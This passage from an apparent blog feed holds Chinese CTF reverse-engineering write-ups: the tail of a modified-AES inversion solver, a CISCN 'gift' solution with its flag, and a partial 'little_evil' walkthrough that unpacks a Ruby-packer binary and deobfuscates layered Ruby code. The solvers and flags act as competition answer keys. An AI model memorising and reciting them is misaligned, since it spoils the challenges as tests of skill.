&#125;;<br>    <span class="hljs-keyword">int</span> target[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<br>            <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xEF</span><br>    &#125;;<br><br><span class="hljs-comment">//    1. 字节内移位</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    2. 轮密钥加密</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    3. shift</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    4. aes S盒加密置换</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    5. 矩阵乘法</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    6. shift</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    7. xor密钥运算</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    8. 列混合</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    9. shift</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ori:\n&quot;</span>);<br>    printArray(target);<br><br>    deShiftRows(target);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;9. shift_in:\n&quot;</span>);<br>    printArray(target);<br><br><br>    deMixColumns(target);<br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;8. 列混合 in:\n&quot;</span>);<br>    printArray(target);<br><br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>         <span class="hljs-comment">//   printf(&quot;%x %x\n&quot;,xor2[i * 4 + j],  target[i * 4][j]);</span><br>            target[i][j] ^= xor2[i * <span class="hljs-number">4</span> + j];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 7. xor密钥运算 in:\n&quot;</span>);<br>    printArray(target);<br><br>    deShiftRows(target);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 6. shift in:\n&quot;</span>);<br>    printArray(target);<br><br><br><br>    <span class="hljs-comment">// 矩阵逆</span><br>    <span class="hljs-keyword">int</span> target2[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0xb5</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xc5</span>,<br>                         <span class="hljs-number">0x74</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x4b</span>,<br>                         <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2</span>,<br>                         <span class="hljs-number">0x19</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xf6</span>&#125;;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5. 矩阵乘法 in:\n&quot;</span>);<br>    printArray(target2);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            target2[i][j] = S3[target2[i][j]];<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4. aes S盒加密置换 in:\n&quot;</span>);<br>    printArray(target2);<br><br>    deShiftRows(target2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 3. shift in:\n&quot;</span>);<br>    printArray(target2);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            target2[i][j] ^= <span class="hljs-number">0x6e</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2. 轮密钥加密 in:\n&quot;</span>);<br>    printArray(target2);<br><br><br>    ror(target2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1.in:\n&quot;</span>);<br>    printArray(target2);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>AES</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN gift</title>
    <link href="/2021/05/16/CISCN-gift/"/>
    <url>/2021/05/16/CISCN-gift/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN-gift"><a href="#CISCN-gift" class="headerlink" title="CISCN gift"></a>CISCN gift</h1><p>题目下载: <a href="/2021/05/16/CISCN-gift/CISCN_gift.exe" title="CISCN_gift.exe">CISCN_gift.exe</a></p><p>golang 写的程序，要优化一个内置算法</p><p>程序逻辑如下（不是解题脚本）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">tab1 = [<span class="hljs-number">0x0000000000000001</span>, <span class="hljs-number">0x0000000000000003</span>, <span class="hljs-number">0x0000000000000006</span>, <span class="hljs-number">0x0000000000000009</span>, <span class="hljs-number">0x000000000000000A</span>, <span class="hljs-number">0x000000000000000B</span>, <span class="hljs-number">0x000000000000000C</span>, <span class="hljs-number">0x000000000000000D</span>, <span class="hljs-number">0x000000000000000E</span>, <span class="hljs-number">0x000000000000000F</span>, <span class="hljs-number">0x0000000000000010</span>, <span class="hljs-number">0x0000000000000011</span>, <span class="hljs-number">0x0000000000000012</span>, <span class="hljs-number">0x0000000000000014</span>, <span class="hljs-number">0x0000000000000019</span>, <span class="hljs-number">0x000000000000001E</span>, <span class="hljs-number">0x0000000000000028</span>, <span class="hljs-number">0x0000000000000042</span>, <span class="hljs-number">0x0000000000000066</span>, <span class="hljs-number">0x00000000000000A0</span>, <span class="hljs-number">0x0000000000000936</span>, <span class="hljs-number">0x0000000000003D21</span>, <span class="hljs-number">0x00000000000149A7</span>, <span class="hljs-number">0x00000000000243AC</span>, <span class="hljs-number">0x00000000000CB5BE</span>, <span class="hljs-number">0x000000000047DC61</span>, <span class="hljs-number">0x00000000016C0F46</span>, <span class="hljs-number">0x000000000262C432</span>, <span class="hljs-number">0x0000000004ACE299</span>, <span class="hljs-number">0x0000000010FBC92A</span>, <span class="hljs-number">0x00000000329ECDFD</span>, <span class="hljs-number">0x00000000370D7470</span>]<br>idx = <span class="hljs-number">0</span><br>idddd = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_goooo</span>(<span class="hljs-params">data</span>):</span><br>    v4 = [<span class="hljs-number">0</span>] * <span class="hljs-number">5</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        v3 = data[i]<br>        v4[v3] ^= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> v4[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> v4[<span class="hljs-number">3</span>] == <span class="hljs-number">0</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_wtf</span>(<span class="hljs-params">pos, index, data, size1, size2</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> idddd<br>    data[pos] = index<br>    print(data)<br>    <span class="hljs-keyword">if</span> pos == size1 - <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> main_goooo(data):<br>            idddd = idddd + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>            main_wtf(pos + <span class="hljs-number">1</span>, i, data, size1, size2)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">TestN</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">global</span> idddd<br>    idddd = <span class="hljs-number">0</span><br>    aa = [<span class="hljs-number">0</span>] * n<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>        main_wtf(<span class="hljs-number">0</span>, i, aa, n, n)<br>    <span class="hljs-keyword">return</span> idddd<br><br>flag_i = [TestN(i) % <span class="hljs-number">17</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tab1]<br></code></pre></td></tr></table></figure><p>这个算法很慢，基本不可能跑出来。</p><p>TestN(1), TestN(2), TestN(3) … 跑一些比较小的额数据观察一下，很容易发现规律，用规律求解 flag 序列</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">flag_i = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tab1)):<br>    t = tab1[i]<br>    s1 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,t-<span class="hljs-number">1</span>,<span class="hljs-number">17</span>)<br>    s2 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,t-<span class="hljs-number">1</span>,<span class="hljs-number">17</span>)+<span class="hljs-number">1</span><br>    tmp = (s1*s2)%<span class="hljs-number">17</span><br>    out.append(tmp)<br>print(flag_i)<br><br>=&gt; [2, 3, 2, 2, 6, 3, 4, 0, 2, 12, 5, 2, 6, 4, 2, 2, 5, 6, 2, 5, 2, 2, 12, 4, 2, 2, 2, 6, 2, 6, 0, 5]<br></code></pre></td></tr></table></figure><p>得到序列后直接映射到 flag 字符即可</p><p>CISCN{4b445b3247c45344c54c44734445452c}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN Little_evil</title>
    <link href="/2021/05/16/CISCN-Little-evil/"/>
    <url>/2021/05/16/CISCN-Little-evil/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN-little-evil"><a href="#CISCN-little-evil" class="headerlink" title="CISCN little_evil"></a>CISCN little_evil</h1><p>比赛的时候差一点点出，非常可惜</p><p>第一次做 ruby 的逆向题，学到很多东西。这道题总体来说，要进行两种不同策略的反混淆，最后还有一层是类似于 brainfuck 的 vm，需要写 <code>decompiler</code></p><p>题目: <a href="/2021/05/16/CISCN-Little-evil/little_evil" title="littile_evil">littile_evil</a></p><h2 id="提取-out-rb"><a href="#提取-out-rb" class="headerlink" title="提取 out.rb"></a>提取 out.rb</h2><p>题目的 elf 文件是典型的 ruby 解释器。问题是源码在哪里？ 最开始，我以为是内存加载，分析源码过程中发现是用 Ruby packer 打包的 ruby 程序。Ruby packer 会把源程序相关的打包成 squashfs 文件系统并塞进 ruby 解释器。ruby packer 用了一个内存虚拟文件系统 <code>__enclose_io_memfs__</code></p><p>squashfs 用 binwalk 就可以直接提取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">binwalk -Me little_evil<br></code></pre></td></tr></table></figure><p>提取出主程序（节选）</p><p><strong>enclose_io_memfs</strong>/local/out.rb</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$l1Il</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$l1lI</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">llIl</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span> = <span class="hljs-variable">$lI1lll</span><span class="hljs-params">|7;<span class="hljs-keyword">end</span>;def l1lll()$lI1lll=10;<span class="hljs-keyword">end</span>;def llI1l()$lI1lll=$lI1lll|</span><span class="hljs-number">4</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lIlI</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>+<span class="hljs-number">3</span>;<br><span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l111</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>%<span class="hljs-number">3</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lI1IlI</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|3;<span class="hljs-keyword">end</span>;def ll1l1()$lI1lll=$lI1lll*8;<span class="hljs-keyword">end</span>;def l1lI()$lI1lll=$lI1lll-3;<span class="hljs-keyword">end</span>;def lI1lII()$lI1lll=$lI1lll%1;<span class="hljs-keyword">end</span>;def lIlIl()$lI1lll=$lI1lll&amp;10;<span class="hljs-keyword">end</span>;def lIll()$lI1lll=$lI1lll-4;<span class="hljs-keyword">end</span>;def lII1()$lI1lll=$lI1lll%2;<span class="hljs-keyword">end</span>;def l1III()$lI1lll=$lI1lll|</span><span class="hljs-number">1</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1l111</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|5;<span class="hljs-keyword">end</span>;def l1IIII()$lI1lll=$lI1lll%10;<span class="hljs-keyword">end</span>;def l11I()$l1Il=$l1Il+$lI1lll.chr;<span class="hljs-keyword">end</span>;def lIlll()$lI1lll=$lI1lll*9;<span class="hljs-keyword">end</span>;def l11IlI()$lI1lll=$lI1lll-8;<span class="hljs-keyword">end</span>;def lI1I1()$lI1lll=$lI1lll+5;<span class="hljs-keyword">end</span>;def ll11lI()$lI1lll=$lI1lll&amp;9;<span class="hljs-keyword">end</span>;def lII1l1()send($l1Il[0,4], $l1Il[4,$l1Il.length]);<span class="hljs-keyword">end</span>;l1lll;lIlI;ll1l1;l1lI;l11I;l1lll;llI1l;lIlll;l11IlI;l11I;l1lll;lIlll;llI1l;lIlI;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llI1l;l1IIII;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;l1lI;ll1l1;l1l111;l11I;l1lll;llI1l;lI1I1;lI1I1;llIl;lIlI;l11I;l1lll;llI1l;lI1I1;lI1I1;llIl;lIlI;l11I;l1lll;l1lI;ll1l1;lIlI;l11I;l1lll;llI1l;l1IIII;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;ll1l1;l1lI;lIll;l11I;l1lll;ll1l1;l1lI;lIll;l11I;l1lll;l1lI;ll1l1;l1l111;l11I;l1lll;llI1l;lI1I1;</span><br><span class="hljs-params">......[节选]</span><br></code></pre></td></tr></table></figure><h2 id="第一层-ruby-程序"><a href="#第一层-ruby-程序" class="headerlink" title="第一层 ruby 程序"></a>第一层 ruby 程序</h2><p>提取出来的 rb 程序高度混淆，难以阅读，尝试过各种在线美化工具，均无效果，于是尝试手搓反混淆。</p><p>思路:</p><ul><li>分号 ; 替换成 ;\n</li><li>解析函数名，替换所有函数名为 funcX，x是序号</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out.rb&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br>data = data.replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;;\n&quot;</span>)<br>data = data.replace(<span class="hljs-string">&quot;()&quot;</span>, <span class="hljs-string">&quot;()\n\t&quot;</span>)<br>data = data.replace(<span class="hljs-string">&quot;end;&quot;</span>, <span class="hljs-string">&quot;end;\n&quot;</span>)<br><br><br>names = &#123;&#125;<br>iidx = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data.splitlines():<br>    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;def&quot;</span>):<br>        idx = line.find(<span class="hljs-string">&quot;(&quot;</span>)<br>        funcName = line[<span class="hljs-number">4</span>:idx]<br>        names[funcName] = <span class="hljs-string">&quot;func&quot;</span> + <span class="hljs-built_in">str</span>(iidx)<br>        iidx += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> names:<br>    data = data.replace(k + <span class="hljs-string">&quot;()&quot;</span>, names[k] + <span class="hljs-string">&quot;()&quot;</span>, -<span class="hljs-number">1</span>)<br>    data = data.replace(k + <span class="hljs-string">&quot;;&quot;</span>, names[k] + <span class="hljs-string">&quot;;&quot;</span>, -<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out2.rb&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(data)<br></code></pre></td></tr></table></figure><p>简单处理后效果</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$l1Il</span>=<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$l1lI</span>=<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span> = <span class="hljs-variable">$lI1lll</span><span class="hljs-params">|7;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func2()</span><br><span class="hljs-params">$lI1lll=10;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func3()</span><br><span class="hljs-params">$lI1lll=$lI1lll|</span><span class="hljs-number">4</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func4</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>+<span class="hljs-number">3</span>;<br><br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func5</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>%<span class="hljs-number">3</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func6</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|3;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func7()</span><br><span class="hljs-params">$lI1lll=$lI1lll*8;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func8()</span><br><span class="hljs-params">$lI1lll=$lI1lll-3;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func9()</span><br><span class="hljs-params">$lI1lll=$lI1lll%1;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func10()</span><br><span class="hljs-params">$lI1lll=$lI1lll&amp;10;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func11()</span><br><span class="hljs-params">$lI1lll=$lI1lll-4;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func12()</span><br><span class="hljs-params">$lI1lll=$lI1lll%2;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func13()</span><br><span class="hljs-params">$lI1lll=$lI1lll|</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1func5</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|5;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func15()</span><br><span class="hljs-params">$lI1lll=$lI1lll%10;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func16()</span><br><span class="hljs-params">$l1Il=$l1Il+$lI1lll.chr;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func17()</span><br><span class="hljs-params">$lI1lll=$lI1lll*9;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func18()</span><br><span class="hljs-params">$lI1lll=$lI1lll-8;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func19()</span><br><span class="hljs-params">$lI1lll=$lI1lll+5;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func20()</span><br><span class="hljs-params">$lI1lll=$lI1lll&amp;9;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func21()</span><br><span class="hljs-params">send($l1Il[0,4], $l1Il[4,$l1Il.length]);</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">func2;</span><br></code></pre></td></tr></table></figure><p><code>func21()</code> 中有一个 <code>send</code>，ruby 中的 send 貌似可以执行代码，修改代码，在 func21 调用时输出 <code>$l1Il[4,$l1Il.length]</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> func<span class="hljs-number">21</span>()<br><span class="hljs-attribute">print</span> $l<span class="hljs-number">1</span>Il[<span class="hljs-number">4</span>,$l<span class="hljs-number">1</span>Il.length]<br><span class="hljs-attribute">send</span>($l<span class="hljs-number">1</span>Il[<span class="hljs-number">0</span>,<span class="hljs-number">4</span>], $l<span class="hljs-number">1</span>Il[<span class="hljs-number">4</span>,$l<span class="hljs-number">1</span>Il.length]);<br><span class="hljs-attribute">end</span>;<br></code></pre></td></tr></table></figure><p>输出得到另外一个 ruby 程序。总结一下，第一层 ruby 程序计算出第二层 ruby 程序的字符串并调用第二层 ruby 程序。</p><h2 id="第二层-ruby-程序"><a href="#第二层-ruby-程序" class="headerlink" title="第二层 ruby 程序"></a>第二层 ruby 程序</h2><p>第二层 ruby 程序混淆规则也类似第一层的 ruby 程序。</p><p>节选第二层 ruby 程序</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$llll</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$llII</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1llI</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">7</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ll1III</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>%<span class="hljs-number">7</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lllI</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>/<span class="hljs-number">4</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lIl1l</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-number">-3</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1lll</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">10</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l11I1I</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-number">10</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1l1</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>&amp;<span class="hljs-number">7</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1II</span></span>()<span 